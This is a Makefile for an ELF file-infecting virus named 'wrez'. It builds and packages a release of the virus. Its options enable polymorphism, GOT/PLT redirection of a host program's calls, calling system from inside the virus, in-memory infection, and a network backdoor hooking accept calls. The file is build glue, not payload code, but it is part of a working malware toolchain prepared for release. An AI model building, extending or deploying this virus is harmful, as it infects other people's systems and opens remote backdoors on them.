
VERSION=0.7.8
DFLAGS += -DPOLYMORPHISM	# make the virus polymorph

# LOOKUP module (lookup.[ch])
#DFLAGS += -DLOOKUP		# PLT/GOT capabilities
#DFLAGS += -DLOOKUP_LIBC_CALL_EXAMPLE	# call system from within the virus
#DFLAGS += -DLOOKUP_GOT_REDIRECTION_EXAMPLE	# redirect printf calls of host
#DFLAGS += -DLOOKUP_GOT_DEEP_REDIRECTION_EXAMPLE	# redirect deep calls of libs

# INMEM module (inmem.[ch])
#DFLAGS += -DINMEM

# FINGERPRINT module (fingerprint.c, crypto.c)
#DFLAGS += -DFINGERPRINT

# NETWORK BACKDOOR module, using accept
#DFLAGS += -DLOOKUP_BACKDOOR_NETWORK_MAGIC	# hooks all accept calls


###
### DO NOT CHANGE ANYTHING BELOW THIS LINE
###

CFLAGS += -Wall -fconserve-space -Os -fno-builtin $(DFLAGS) -g -ggdb

OBJS =	wrcore.o inmem.o lime.o lime-interface.o lookup.o fingerprint.o crypto.o


CC=gcc-2.95
CC_USER=gcc
CFLAGS_USER=-Wall -g -ggdb

all:	wrez

dist:	releaseclean release
	make distclean

releaseclean:	distclean
	rm -fR release*

release:	releaseclean wrez sweep clean
	rm -fR release*
	mkdir release-$(VERSION)
	mv wrez.bin.out wrez.bin.conf initial infect wrezsweep \
		release-$(VERSION)/

distclean:	clean
	rm -f wrez.map
	rm -f wrez.bin.out
	rm -f infect initial

clean:	cryptoclean limeclean lookupclean
	rm -f wrez
	rm -f *.o
	rm -f wrezdefs.h wrezdefs.inc

	echo | awk '{ printf ("#define WREZ_CFG_START 0x41414141\n"); }' >> wrezdefs.h
	echo | awk '{ printf ("#define WREZ_SIZE 0x41414141\n"); }' >> wrezdefs.h
	echo | awk '{ printf ("wrez_len equ 0x41414141\n"); }' >> wrezdefs.inc

	# additional build process stuff
	rm -f compressor
	rm -f wrez.bin wrez.2nd wrez.2nd.compressed

fclean:
	rm -f wrez *.o

sweep:	wrezsweep.c
	$(CC) -o wrezsweep wrezsweep.c -Wall -g -ggdb

# lookup and linker engine
lookupclean:
	rm -f lookup
	rm -fR lookup-test

lookuptest:	lookup.c
	rm -fR lookup-test
	mkdir lookup-test
	cd lookup-example ; ./shared-library-build.sh ; cd ..
	$(CC_USER) $(CFLAGS_USER) -Llookup-example -lshared-library \
		-DTESTING -DTESTING_DEBUG -o lookup lookup.c
	mv lookup lookup-test/
	mv lookup-example/libshared-library.so lookup-test/
	mv lookup-example/shared-library-use lookup-test/
	echo "# use with 'source ldpath.sh' to set LD_LIBRARY_PATH" > lookup-test/ldpath.sh
	echo >> lookup-test/ldpath.sh
	echo "export LD_LIBRARY_PATH=\`pwd\`" >> lookup-test/ldpath.sh
	chmod 755 lookup-test/ldpath.sh

lookuptestpm:	lookup-pm.c
	rm -fR lookup-test
	mkdir lookup-test
	cd lookup-example ; ./shared-library-build.sh ; cd ..
	$(CC_USER) $(CFLAGS_USER) -Llookup-example -lshared-library \
		-DTESTING -DTESTING_DEBUG -o lookup-pm lookup-pm.c
	mv lookup-pm lookup-test/
	mv lookup-example/libshared-library.so lookup-test/
	mv lookup-example/shared-library-use lookup-test/
	echo "# use with 'source ldpath.sh' to set LD_LIBRARY_PATH" > lookup-test/ldpath.sh
	echo >> lookup-test/ldpath.sh
	echo "export LD_LIBRARY_PATH=\`pwd\`" >> lookup-test/ldpath.sh
	chmod 755 lookup-test/ldpath.sh

# in-memory infection engine
inmemtest:	inmem.c lookup-pm.c
	$(CC_USER) $(CFLAGS_USER) -c -o lookup-pm.o lookup-pm.c
	@echo
	@echo "# ignore warnings about missing external prototypes in 'inmem'"
	@echo
	$(CC_USER) $(CFLAGS_USER) -o inmem inmem.c lookup-pm.o -DTESTING
	$(CC_USER) $(CFLAGS_USER) -o /tmp/inmem-test inmem-test.c
	@echo
	@echo "# fix the page permissions of ./inmem executeable to +rwx on first segment"
	@echo

# the compressor (not included within final binary)
compressor:	compressor.c
	$(CC) -o compressor compressor.c -O2 -g -ggdb

initial:	initial.c
#	diet $(CC) -static -o initial initial.c -g -ggdb -Wall
	$(CC) -o initial initial.c -g -ggdb -Wall

# polymorphism engine (lime)
lime.o:	lime.asm
	nasm -f elf -o lime.o lime.asm

limeclean:
	rm -f lime-interface-test lime*.o

limetest:	lime-interface-test.c lime-interface.o lime.o
	$(CC) $(CFLAGS) -c -o lime-interface-test.o lime-interface-test.c
	ld -s -T lime-interface-test.lds -o lime-interface-test

# crypto stuff
cryptotest:	crypto-test.c crypto.c
	$(CC_USER) $(CFLAGS_USER) -o crypto-test crypto-test.c crypto.c
	./crypto-test AAAAAAAA
	./crypto-test aaaaaaaa

cryptoclean:
	rm -f crypto-test

wrez:	compress.sh compressor initial wrez.asm $(OBJS)

ifneq ($(final),on)
	rm -f wrezdefs.inc wrezdefs.h
	echo | awk '{ printf ("wrez_len equ 0x41414141\n"); }' >> wrezdefs.inc
	nasm -f elf -o wrez.o wrez.asm

	nm wrez.o | grep "wrcfg$$" | \
		awk '{ printf ("#define WREZ_CFG_START 0x%s\n", $$1); }' \
		>> wrezdefs.h
	echo | awk '{ printf ("#define WREZ_SIZE 0x41414141\n"); }' >> wrezdefs.h
	# link using preprocessing linkmap description file
	rm -f wrez-link-actual.lds
	gcc -E -C -P -nostdinc $(DFLAGS) -x c-header wrez-link.lds > wrez-link-actual.lds
	ld -Map wrez.map -s -T wrez-link-actual.lds -o wrez
#	ld -Map wrez.map -T wrez-link.lds -o wrez
	rm -f wrez-link-actual.lds
	size wrez | grep wrez | \
		awk '{ if ($$2 != 0 || $$3 != 0) { \
			printf ("\nWARNING: non-zero absolute elements\n\n"); \
			exit (1); } }'

	# get proper size
	size wrez | grep wrez | \
		awk '{ printf ("#define WREZ_SIZE %s\n", $$1); }' \
		>> wrezdefs.h
	cat wrezdefs.h | grep -v "#define WREZ_SIZE 0x41414141" > wrezdefs.h.temp
	mv wrezdefs.h.temp wrezdefs.h

	# fixup length in .inc assembler include file
	size wrez | grep wrez | \
		awk '{ printf ("wrez_len equ %s\n", $$1); }' \
		> wrezdefs.inc

	make final=on fclean wrez
else
	nasm -f elf -o wrez.o wrez.asm
	rm -f wrez-link-actual.lds
	gcc -E -C -P -nostdinc $(DFLAGS) -x c-header wrez-link.lds > wrez-link-actual.lds
	ld -Map wrez.map -s -T wrez-link-actual.lds -o wrez
	rm -f wrez-link-actual.lds

	echo;echo "### final initial infector built. (version $(VERSION))";echo;size wrez

	./compress.sh
endif


